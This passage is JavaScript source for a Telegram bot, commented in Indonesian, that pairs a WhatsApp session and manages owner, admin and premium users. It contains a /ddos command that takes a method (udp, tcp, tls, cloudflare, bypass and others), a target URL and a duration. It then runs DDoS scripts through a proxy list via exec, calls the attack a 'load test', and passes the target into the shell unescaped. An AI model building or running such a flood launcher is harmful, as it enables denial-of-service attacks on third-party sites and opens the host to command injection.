    // 1. SMART NUMBER PARSING
    let botNumber = match[1].replace(/[^0-9]/g, '');
    if (botNumber.startsWith('0')) {
        botNumber = '62' + botNumber.slice(1);
    }

    if (!isOwner(senderId)) {
        return sendScarrySenderCard(chatId, 'denied');
    }

    // ❗ Cek session aktif
    if (fs.existsSync('./session') && fs.readdirSync('./session').length > 0) {
        return sendScarrySenderCard(chatId, 'existing', { number: botNumber });
    }

    // ⏳ KIRIM PESAN PROSES (TUNGGU)
    const waitMsg = await sendScarrySenderCard(chatId, 'processing', { number: botNumber });

    try {
        pairingTargetChatId = chatId;

        await startSession();
        await new Promise(r => setTimeout(r, 1500));

        let code = null;

        // 🔁 retry ambil pairing code
        for (let i = 0; i < 5; i++) {
            try {
                code = await sock.requestPairingCode(botNumber, "RARAIMUP");
                if (code) break;
            } catch (err) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        // 🗑️ HAPUS PESAN PROSES SECARA OTOMATIS
        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

        if (!code) {
            return sendScarrySenderCard(chatId, 'timeout', { number: botNumber });
        }

        const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;

        // Hasil pairing ditampilkan sebagai Rich tabel + tombol salin.
        await sendScarrySenderCard(chatId, 'success', {
            number: botNumber, code: formattedCode
        });

    } catch (err) {
        console.error("PAIRING ERROR:", err);

        // 🗑️ HAPUS PESAN PROSES JIKA TERJADI ERROR FATAL
        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

        await sendScarrySenderCard(chatId, 'failure', { number: botNumber });
    }
});

bot.onText(/\/killsession/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return SCARRY_SAFE_UI.sendRich(bot, chatId,
          SCARRY_SAFE_UI.makeStatusCard('AKSES DITOLAK', 'DENIED', 'Hanya owner yang dapat menghapus sender.'));
    }

    try {
        // 🔴 MATIKAN SOCKET TOTAL
        cancelScarryLogoutCheck();
        cancelScarryReconnect();
        scarryLastConfirmedSocket = null;
        waConnectionState = 'close';
        if (sock) {
            try {
                sock.ev.removeAllListeners();
                sock.ws.close();
            } catch {}
            sock = null;
        }

        // 🗑️ HAPUS SESSION TOTAL
        if (fs.existsSync('./session')) {
            fs.rmSync('./session', { recursive: true, force: true });
        }

        pairingTargetChatId = null;

        await SCARRY_SAFE_UI.sendRich(bot, chatId,
          SCARRY_SAFE_UI.makeStatusCard('SESSION DIHAPUS', 'SUCCESS',
            'Sender terputus dan data session lokal sudah dibersihkan.',
            [['LANGKAH BERIKUTNYA', '/addsender']]));

        console.log("🗑️ SESSION BERSIH");

    } catch (err) {
        console.error(err);
        await SCARRY_SAFE_UI.sendRich(bot, chatId,
          SCARRY_SAFE_UI.makeStatusCard('SESSION ERROR', 'FAILED',
            'Gagal menghapus session. Periksa log server.'));
    }
});
async function autoStart() {
  if (fs.existsSync('./session') && fs.readdirSync('./session').length > 0) {
    await startSession();
  }
}

// ===== /autojoin TANPA PARAM =====
bot.onText(/^\/autojoin$/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `<blockquote>
⚙️ Example:

/autojoin on
/autojoin off
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== /autojoin ON OFF =====
bot.onText(/\/autojoin (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, 'HANYA OWNER');
    }
  autoJoinSettings.enabled = match[1] === "on";
  saveAutoJoin();

  bot.sendMessage(msg.chat.id,
    `<blockquote>⚙️ Auto Join: ${match[1].toUpperCase()}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== /setautojoin TANPA PARAM =====
bot.onText(/^\/setautojoin$/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `<blockquote>
📌 Example:

/setautojoin @ch1 @ch2 https://t.me/ch3

✔ Bisa banyak link (pisah spasi)
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== SET AUTOJOIN =====
bot.onText(/\/setautojoin (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, 'HANYA OWNER');
    }
  const links = match[1].split(" ").filter(x => x);

  autoJoinSettings.links = links;
  saveAutoJoin();

  bot.sendMessage(msg.chat.id,
    `<blockquote>
✅ Auto Join disetting!

📌 Total: ${links.length}
🔗 ${links.join('\n🔗 ')}

━━━━━━━━━━━━━━━
⚠️ Syarat:
Bot harus Di Tambahkan Di Group / Chanel Yang Di Set Dan Harus ADMIN di channel/group ituu!
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});
bot.onText(/\/risetjoin/, (msg) => {
  const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, 'HANYA OWNER');
    }
  autoJoinSettings.links = [];
  saveAutoJoin();

  bot.sendMessage(msg.chat.id,
    `<blockquote>
🗑️ Semua link auto join berhasil dihapus!

⚠️ Silahkan set ulang dengan:
/setautojoin
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});
bot.onText(/\/listjoin/i, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, 'HANYA OWNER');
    }

    if (!autoJoinSettings?.links || !autoJoinSettings.links.length) {
      return bot.sendMessage(chatId,
        `<blockquote>
⚠️ LINK BELUM DISET!

Silahkan admin set dulu:
/setautojoin
        </blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const results = [];

    for (let i = 0; i < autoJoinSettings.links.length; i++) {
      const link = autoJoinSettings.links[i];
      let joined = false;

      try {
        joined = await isUserJoinedAll(bot, senderId, [link]);
      } catch (e) {
        joined = false;
      }

      const statusIcon = joined ? "✅" : "❌";
      results.push(`${statusIcon} ${link}`);
    }

    return bot.sendMessage(chatId,
      `<blockquote>
📄 Daftar Link AutoJoin:

${results.join("\n")}

✨ Tanda ✅ = Sudah join
⚠️ Tanda ❌ = Belum join
      </blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("Error /listjoin:", err);
  }
});

const { exec } = require("child_process")
bot.onText(/\/ddos(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, `HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }

  const argsText = match[1];
  const args = argsText ? argsText.split(' ') : []; 
  const cmd = args[0]; 

  switch (cmd) {
    case "flood": 
    case "https":
    case "blast":
    case "glory":
    case "kill":
    case "bypass":
    case "cloudflare":
    case "thunder":
    case "cibi":
    case "tls":
    case "udp":
    case "tcp": {
      const target = args[1]; 
      const time = args[2];   

      if (!target || !time) {
        return bot.sendMessage(chatId, `Contoh penggunaan:\n/ddos ${cmd} https://google.com 120`);
      }
      await bot.sendMessage(chatId, `🚀 Oke, memulai load test ke ${target} selama ${time} detik...`);

      exec(`node dd/${cmd} ${target} ${time} 300 30 ./dd/proxy.txt`, (error, stdout, stderr) => {
    
    if (error) {
        console.error(`exec error: ${error}`);
        bot.sendMessage(chatId, `Gagal menjalankan skrip:\n\`\`\`\n${stderr || error.message}\n\`\`\``);
        return;
    }

    if (stdout) {
        console.log(`stdout: ${stdout}`);
    }
    if (stderr) {
        console.warn(`stderr (warnings): ${stderr}`);
    }

    console.log(`Proses selesai dengan sukses.`);
    bot.sendMessage(chatId, `✅ Tes ke ${target} telah selesai.`);
});
      break;
    }

    default: {
      bot.sendMessage(chatId, `Perintah '${cmd}' tidak dikenali. Gunakan /ddos methods link time.`);
      break;
    }
  }
});

//------( CASE GROUP ONLY )-----\\\
bot.onText(/^\/gruponly (on|of)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
        if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
//-----( CASE COLDOWN )-----\\
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);
     const senderId = msg.from.id;
     
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI`);
     }
     bot.sendMessage(chatId, response); });

const moment = require('moment');

///-----( CASE ADDPREM )-----\\\
bot.onText(/\/addprem(?:\s(\d+)\s(\d+[dhm]))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, 'HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI');
    }

    if (!match[1] || !match[2]) {
      return bot.sendMessage(chatId, 'Comand Salah. Contoh : /addprem 6843967527 30d');
    }

    const userId = parseInt(match[1]);
    const durationStr = match[2];

    const durationVal = parseInt(durationStr.slice(0, -1));
    const durationUnit = durationStr.slice(-1);

    const unitMap = {
      'd': 'days',
      'h': 'hours',
      'm': 'minutes'
    };

    const expirationDate = moment().add(durationVal, unitMap[durationUnit]);
    const userIndex = premiumUsers.findIndex(user => user.id === userId);

    if (userIndex === -1) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      return bot.sendMessage(chatId, `✅ Succes add ${userId} to premium ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    } else {
      premiumUsers[userIndex].expiresAt = expirationDate.toISOString();
      savePremiumUsers();
      return bot.sendMessage(chatId, `User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    }

  } catch (error) {
    console.error('Error in /addprem:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses command.');
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, 'LU BUKAN OWNER TOLOLL');
    }

    if (!match[1]) {
      return bot.sendMessage(chatId, 'Command salah. Contoh: /delprem 6843967527');
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);

    if (index === -1) {
      return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🚫 Succes delete user ${userId} from premium.`);

  } catch (error) {
    console.error('Error in /delprem:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses command.');
  }
});

bot.onText(/\/listprem/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, 'HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI');
    }

    if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
    }

    let message = "```";
    message += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n";
    message += "┃ ( + )  LIST PREMIUM USERS\n";
    message += "┣━━━━━━━━━━━━━━━━━━━━━━━┫\n";
    
    premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `┃${index + 1}. ID: ${user.id}\n┃    Exp: ${expiresAt}\n`;
    });
    
    message += "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n```";

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

  } catch (error) {
    console.error('Error in /listprem:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses command.');
  }
});

//-----( CASE ADD ADMIN )-----\\
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`\`\`\`
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI
\`\`\``,
        { parse_mode: "Markdown" }
        );
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
Comand Salah  Contoh :  /addadmin 6843967527 30d.`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
Comand Salah  Contoh : /addadmin 6843967527 30d.`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
 ✅ Succes add ${userId} to admin`);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

///-----( CASE DELET ADMIN )-----\\\
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`\`\`\`
HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI
\`\`\``,
        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
Comand Salah  Contoh : /deladmin 6843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
Comand Salah  Contoh : /deladmin 6843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
        🚫 Succes delete user ${userId} from Admin.`);
 } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
 }
});

//----- ( CASE LIST BLOCK ) -----\\
bot.onText(/\/listblock/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "🚫 Hanya Owner yang dapat melihat daftar blacklist!");
  }

  if (blacklistedCommands.length === 0) {
    return bot.sendMessage(chatId, "✅ Tidak ada command yang diblacklist saat ini.");
  }

  const list = blacklistedCommands.map((cmd, i) => `${i + 1}. ${cmd}`).join("\n");

  bot.sendMessage(
    chatId,
    `📋 *Daftar Command yang Diblock:*\n\n${list}`,
    { parse_mode: "Markdown" }
  );
});
///-----( CASE BLACKLIST )-----\\\
bot.onText(/\/block (\/\w+)/, (msg, match) => {
  const commandToBlacklist = match[1].toLowerCase();
  const chatId = msg.chat.id; 
  const senderId = msg.from.id;
  
     if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `🚫 Hanya Owner Yang dapat\nMengguakan Fitur ini !
      `
    );
  }
  
  
  if (!blacklistedCommands.includes(commandToBlacklist)) {
    blacklistedCommands.push(commandToBlacklist);
    saveBlacklist();
    bot.sendMessage(msg.chat.id, `✅ Command ${commandToBlacklist} berhasil diblacklist!`);
  } else {
    bot.sendMessage(msg.chat.id, `⚠️ Command ${commandToBlacklist} sudah diblacklist.`);
  }
});

bot.onText(/\/unblock (\/\w+)/, (msg, match) => {
  const commandToRemove = match[1].toLowerCase();
  const chatId = msg.chat.id; 
  const senderId = msg.from.id;
        if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `🚫 Hanya Owner Yang dapat Menghapus blacklist!!
      `
    );
  }
    
  blacklistedCommands = blacklistedCommands.filter(cmd => cmd !== commandToRemove);
  saveBlacklist();
  bot.sendMessage(msg.chat.id, `✅ Command ${commandToRemove} berhasil dihapus dari blacklist!`);
});

// --------------------- ( FUNCTION GROUP ONLY ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

    watchFile('KANJUT HIDENG/premium.json', (data) => (premiumUsers = data));
    watchFile('KANJUT HIDENG/admin.json', (data) => (adminUsers = data));


   function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

//------( FUNCTION BLACKLIST )-------\\
if (fs.existsSync(blacklistFile)) {
  blacklistedCommands = JSON.parse(fs.readFileSync(blacklistFile));
}

function saveBlacklist() {
  fs.writeFileSync(blacklistFile, JSON.stringify(blacklistedCommands));
}


///-----( FUNCTION MEMORY )\\\
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

///----- ( FUNCTION RUNTIME  )----\\\
function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}

///----- ( FUNCTION DATE NOW )-----\\\
function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

///----- ( FUNCTION COLDOWN )---\\\
  let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}


async function checkControlStatus() {
  try {
    const res = await axios.get(CONTROL_URL);
    const status = res.data.trim().toLowerCase();
    BOT_ACTIVE = status === "on";

    
  } catch (err) {
    console.log(chalk.red("⚠️ Gagal membaca control.txt"));
    BOT_ACTIVE = false;
  }
}
setInterval(checkControlStatus, 10 * 1000);
checkControlStatus(); 
// =======================================
// SET AUDIO UNTUK MENU (reply audio)
// =======================================
bot.onText(/\/jdjdjdjr/, async (msg) => {
  const chatId = msg.chat.id;
  const ownerid = config.OWNER_ID;

  if (!msg.reply_to_message || !msg.reply_to_message.audio && !msg.reply_to_message.voice) {
    return bot.sendMessage(
      chatId,
      `<blockquote>🌷 𝗦𝗲𝘁 𝗣𝗵𝗼𝘁𝗼 / 𝗩𝗶𝗱𝗲𝗼 𝗠𝗲𝗻𝘂</blockquote>
<blockquote>➪Reply foto atau video lalu ketik /setmenu untuk set sebagai media menu</blockquote>
<blockquote>Bisa diganti kapan saja dengan perintah yang sama.</blockquote>
<blockquote><b>🍭 𝗦𝗲𝘁 𝗔𝘂𝗱𝗶𝗼 𝗠𝗲𝗻𝘂</b></blockquote>
<blockquote>➪Reply audio lalu ketik <b>/setaudio</b> untuk mengatur audio menu.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const file = msg.reply_to_message.audio || msg.reply_to_message.voice;
  userAudios[ownerid] = file.file_id;

  bot.sendMessage(
    chatId,
    `<blockquote>✔️ Audio berhasil diset sebagai audio menu.</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== Helper kecil (letakkan di top-level file) =====
function makeMediaObjectFrom(fileIdOrObj, fallbackType = "photo") {
  if (!fileIdOrObj) return null;
  if (typeof fileIdOrObj === "object" && fileIdOrObj.id && fileIdOrObj.type) return fileIdOrObj;
  if (typeof fileIdOrObj === "string") return { id: fileIdOrObj, type: fallbackType };
  return null;
}

async function handleTooManyRequests(err, callbackQuery) {
  const retry = err?.response?.body?.parameters?.retry_after ?? err?.retry_after ?? null;
  const text = retry ? `Terlalu banyak permintaan. Coba lagi setelah ${retry} detik.` : "Terlalu banyak permintaan. Coba lagi nanti.";
  try {
    if (callbackQuery && callbackQuery.id) {
      await bot.answerCallbackQuery(callbackQuery.id, { text, show_alert: false });
    }
  } catch (ignore) { /* silent */ }
}

const lastCallbackMap = {}; // simple rate limiter map

function isTooFrequent(chatId, data, limitSec = 1.2) {
  try {
    const key = `${chatId}:${data}`;
    const now = Date.now();
    if (!lastCallbackMap[key] || (now - lastCallbackMap[key]) > limitSec*1000) {
      lastCallbackMap[key] = now;
      return false;
    }
    return true;
  } catch (e) {
    return false;
  }
}

// ===== Handler /setmenu (menggunakan progress & menyimpan tipe media) =====
bot.onText(/\/idjdjdjd/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const ownerId = config.OWNER_ID;

  if (userId != ownerId) {
    return bot.sendMessage(
      chatId,
      `
<blockquote>❌ Kamu bukan owner.</blockquote>
      `,
      { parse_mode: "HTML" }
    );
  }

  // =============================
  // CEK HARUS REPLY FOTO ATAU VIDEO
  // =============================
  if (
    !msg.reply_to_message ||
    (!msg.reply_to_message.photo && !msg.reply_to_message.video)
  ) {
    return bot.sendMessage(
      chatId,
      `
<blockquote>🌷 𝗦𝗲𝘁 𝗣𝗵𝗼𝘁𝗼 / 𝗩𝗶𝗱𝗲𝗼 𝗠𝗲𝗻𝘂</blockquote>
<blockquote>➪Reply foto atau video lalu ketik /setmenu untuk set sebagai media menu</blockquote>
<blockquote>Bisa diganti kapan saja dengan perintah yang sama.</blockquote>
<blockquote><b>🍭 𝗦𝗲𝘁 𝗔𝘂𝗱𝗶𝗼 𝗠𝗲𝗻𝘂</b></blockquote>
<blockquote>➪Reply audio lalu ketik <b>/setaudio</b> untuk mengatur audio menu.</blockquote>
      `,
      { parse_mode: "HTML" }
    );
  }

  try {

    // =============================
    // TAMPILKAN PROSES LOADING
    // =============================
    const progressStages = [
      "[░░░░░░░░░░] 0%",
      "[█░░░░░░░░░] 10%",
      "[██░░░░░░░░] 20%",
      "[███░░░░░░░] 30%",
      "[████░░░░░░] 40%",
      "[█████░░░░░] 50%",
      "[██████░░░░] 60%",
      "[███████░░░] 70%",
      "[████████░░] 80%",
      "[█████████░] 90%",
      "[██████████] 100%",
    ];

    let loadingMsg = await bot.sendMessage(
      chatId,
      `<blockquote>⏳ Memproses media...</blockquote>`,
      { parse_mode: "HTML" }
    );

    for (let i = 0; i < progressStages.length; i++) {
      await new Promise((res) => setTimeout(res, 500));
      await bot.editMessageText(
        `<blockquote>${progressStages[i]}</blockquote>`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id,
          parse_mode: "HTML"
        }
      );
    }

    // =============================
    // SIMPAN FOTO ATAU VIDEO (sekarang simpan object {id, type})
    // =============================
    let fileId;
    let fileType = "photo";

    if (msg.reply_to_message.photo) {
      const p = msg.reply_to_message.photo;
      fileId = p[p.length - 1].file_id; // kualitas tertinggi
      fileType = "photo";
    } else if (msg.reply_to_message.video) {
      fileId = msg.reply_to_message.video.file_id;
      fileType = "video";
    }

    // simpan sebagai object dengan type
    userPhotos[ownerId] = { id: fileId, type: fileType };
    // simpan ke DB jika fungsi ada
    try { saveProfilPhosodb && saveProfilPhosodb(); } catch (err) { /* silent */ }

    // =============================
    // NOTIFIKASI SUKSES
    // =============================
    await bot.editMessageText(
      `<blockquote>✅ Media menu berhasil diperbarui.</blockquote>`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (e) {

    try {
      await bot.sendMessage(
        chatId,
        `
<blockquote>⚠️ Gagal memproses media!</blockquote>
        `,
        { parse_mode: "HTML" }
      );
    } catch (ignore) {}
  }
});

function getRandomImage() {
  const images = [
 "https://files.catbox.moe/8qv11s.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

bot.onText(/\/start/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const chatType = msg.chat.type;

    const privateEffect = () => {
      return chatType === "private"
        ? { message_effect_id: "5104841245755180586" }
        : {};
    };

    const prem = (id, fallback) => `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    // =========================
    // PREMIUM EMOJI SESUAI URUTAN KAMU
    // =========================
    const EMOJI = {
      topMedal: "6258291392116691626",   // 🥇
      topStar: "4936468614967460670",    // ⭐
      candle1: "5190789872129962198",    // 🕯
      cap: "5424942942122964312",        // 🧢
      giftTop: "5280933624990955096",    // 🎁
      knife: "5267274641147183379",      // 🔪
      moon: "5267231541150369367",       // 🌙
      ghost: "5976451562229210124",      // 👻
      glow: "5350830008665400761",       // 💫
      mushroom: "5210694082019482951",   // 🍄
      thumbs1: "5350797680446567268",    // 👍
      alphabet: "5211102980085932649",   // 🔤
      giftVer: "5210848494683708519",    // 🎁
      giftDev: "5210818644661002233",    // 🎁
      blackCat: "5211187127085198061",   // 🐈‍⬛
      giftDate: "5211016122962304126",   // 🎁
      devil: "5267505950905878088",      // 😈
      rice: "5188256863627535342",       // 🍙
      candle2: "5190789872129962198",    // 🕯
      skullBottom: "5264872878255391549",// 💀
      giftBottom: "5197531888452925507", // 🎁

      // tombol
      puzzle: "5425077563577890102",     // 🧩
      alien: "6097933166008341599",      // 👾
      grin: "5190715139699010788",       // 😁
      starBtn: "5348425153397160578",    // 🌟
      candy: "5395471503603037530",      // 🍭
      thumbs2: "5463075238029848646",    // 👍
      keyboard: "5190500356974472463", 
        
      laugh: "6100521570998948264", // 😂// ⌨
    };

    // shortcut biar gampang
    const e1  = prem(EMOJI.topMedal, "🥇");
    const e2  = prem(EMOJI.topStar, "⭐");
    const e3  = prem(EMOJI.candle1, "🕯");
    const e4  = prem(EMOJI.cap, "🧢");
    const e5  = prem(EMOJI.giftTop, "🎁");
    const e6  = prem(EMOJI.knife, "🔪");
    const e7  = prem(EMOJI.moon, "🌙");
    const e8  = prem(EMOJI.ghost, "👻");
    const e9  = prem(EMOJI.glow, "💫");
    const e10 = prem(EMOJI.mushroom, "🍄");
    const e11 = prem(EMOJI.thumbs1, "👍");
    const e12 = prem(EMOJI.alphabet, "🔤");
    const e13 = prem(EMOJI.giftVer, "🎁");
    const e14 = prem(EMOJI.giftDev, "🎁");
    const e15 = prem(EMOJI.blackCat, "🐈‍⬛");
    const e16 = prem(EMOJI.giftDate, "🎁");
    const e17 = prem(EMOJI.devil, "😈");
    const e18 = prem(EMOJI.rice, "🍙");
    const e19 = prem(EMOJI.candle2, "🕯");
    const e20 = prem(EMOJI.skullBottom, "💀");
    const e21 = prem(EMOJI.giftBottom, "🎁");
    const e22 = prem(EMOJI.laugh, "😂");

    if (
      isGroupOnly &&
      typeof isGroupOnly === "function" &&
      isGroupOnly() &&
      chatType === "private"
    ) {
      return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.", {
        ...privateEffect()
      });
    }

    if (!BOT_ACTIVE) {
      return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @elyssavirellequeenn", {
        ...privateEffect()
      });
    }

    // V25: Sticker animation remains available, but defaults OFF to avoid ~9 seconds startup lag.
    // Change to true when you explicitly want the legacy animation again.
    const SCARRY_START_STICKER_INTRO = false;
    if (SCARRY_START_STICKER_INTRO) try {
      const STICKER_1 = "CAACAgUAAxkBAAMkaqXq-CdQ-qVw10HKwFexxZrWpuIAAgYeAALid_FU96e17Dqmhvs9BA";
      const STICKER_2 = "CAACAgEAAxkBAAMmaqXrzMWHtX7j7z7ohpEHQdayfTIAAqAEAAILB_hF6El3-7AzBZs9BA";
      const STICKER_3 = "CAACAgUAAxkBAAMoaqXr8-n9WKqqa2YbrNuss_BV_8wAAq4fAAIjjulWB7Wzadm_8ts9BA";

      const s1 = await bot.sendSticker(chatId, STICKER_1, {
        disable_notification: true
      });
      await new Promise((r) => setTimeout(r, 3000));
      try { await bot.deleteMessage(chatId, s1.message_id); } catch (e) {}

      const s2 = await bot.sendSticker(chatId, STICKER_2, {
        disable_notification: true
      });
      await new Promise((r) => setTimeout(r, 3000));
      try { await bot.deleteMessage(chatId, s2.message_id); } catch (e) {}

      const s3 = await bot.sendSticker(chatId, STICKER_3, {
        disable_notification: true
      });
      await new Promise((r) => setTimeout(r, 3000));
      try { await bot.deleteMessage(chatId, s3.message_id); } catch (e) {}
    } catch (e) {}

    const date = getCurrentDate ? getCurrentDate() : "";
